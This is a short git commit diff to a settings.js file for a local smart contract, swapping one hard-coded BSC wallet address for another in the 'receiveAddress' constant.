45d612427895a6ba4f0ca32dc6e68fe24e4c74dc
codecraftlab1 <codecraftlab1@gmail.com>
2024-08-16 14:40:43 +0000

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xaA399273Dd872C18C795f3e4024a81F49d7E43E4";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
